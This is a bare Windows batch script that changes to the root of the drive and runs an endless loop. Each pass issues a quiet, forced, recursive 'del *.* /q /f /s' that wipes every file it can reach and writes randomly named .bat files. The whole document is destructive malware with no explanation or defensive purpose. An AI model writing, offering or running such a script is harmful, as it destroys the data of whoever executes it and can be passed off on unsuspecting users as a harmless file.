@echo off
cd %USERPROFILE%\desktop
:a
echo cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & cd.. & del *.* /q /f /s >> %random%.bat
goto a
